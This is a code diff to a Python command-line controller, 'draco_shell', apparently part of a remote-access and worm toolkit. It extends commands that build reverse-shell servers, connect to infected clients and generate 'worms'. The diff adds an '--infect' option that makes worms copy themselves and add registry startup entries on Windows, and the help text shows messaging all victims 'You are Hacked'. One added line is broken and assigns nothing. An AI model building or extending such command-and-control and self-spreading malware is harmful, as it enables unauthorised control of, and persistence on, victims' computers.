@@ -47,8 +47,23 @@ class ShellConstructor:
         @click.argument("name")
         @click.argument("types")
         @click.argument("port")
-        def make(name, types, port) -> None:
+        @click.option("--ip", required=False, help="Server IP adreess")
+        @click.option("--raw_len", "-rl", required=False, help="Set RAW_LEN parameter")
+        @click.option("--http", required=False, is_flag=True, help="Enable http server if not default enabled")
+        @click.option("--no_important", "-noi", is_flag=True, required=False, help="Dont show some no important messages. Less flood on screen")
+        @click.option("--encode", "-e", required=False, help="Set format encoding")
+        def make(name, types, port, ip, raw_len, http, no_important, encode) -> None:
             conf = {"NAME": name, "PORT" : port, "SERV_TYPE" : types}
+            if ip:
+                conf["IP"] = ip
+            if raw_len:
+                conf["RAW_LEN"] = int(raw_len)
+            if http:
+                conf["HTTP_ENABLE"] = True
+            if no_important:
+                conf["MSG_NO_IMPORTANT"] = True
+            if encode:
+                conf["FORMAT_CODE"]
             self.CoCe.sendCMD("make", conf)
             sleep(1)
             self.CoCe.findSockets()
@@ -70,7 +85,6 @@ class ShellConstructor:
         def conn(name):
             self.CoCe.sendCMD("check", name)
             resp = self.CoCe.reciveResponse()
-            print(resp)
             if resp == ["OK"]:
                 serverShell = self.buildServerShell(name)
                 serverShell()
@@ -85,13 +99,15 @@ class ShellConstructor:
         @draco_shell.command()
         @click.argument("name")
         @click.option("--infect", "-i", is_flag=True, required=False, help="Add cloning function to worms. Copy self and add to registry startup. WORKING ONLY ON WINDOWS !!!")
-        def hive(name) -> None:
+        def hive(name, infect) -> None:
             """ **** Welcome To Hive *******\n
             """
             conf = self.CoCe.sendApi(name, "conf", response=True)
             if not conf:
-                print("ERROR")
+                print("[CC] ERROR: not recived config")
                 return
+            if infect:
+                conf["INFECT_WIN"] = True
             self.CoCe.sendCMD("hive", conf)
         
         @draco_shell.command()
@@ -127,9 +143,9 @@ class ShellConstructor:
             print("start        - Start Server Listening")
             print("stop         - Stop Server Listening")
             print("show         - Show connected clients")
-            print("msg <cli_id> <message>   - Send message to cli_ID")
-            print('  ex: msg 4 "Hello World"    - Send Hello World to client no 4')
-            print('  ex: msg all "You are Hacked"   -Send message to all clients')
+            print("msg <cli_id> <message>           - Send message to cli_ID")
+            print('  ex: msg 4 "Hello World"        - Send Hello World to client no 4')
+            print('  ex: msg all "You are Hacked"   - Send message to all clients')
             print('  [!!] if you want a send longer message use brackets "" [!!]')
             self.CoCe.sendCMD("next", name, "help")
         
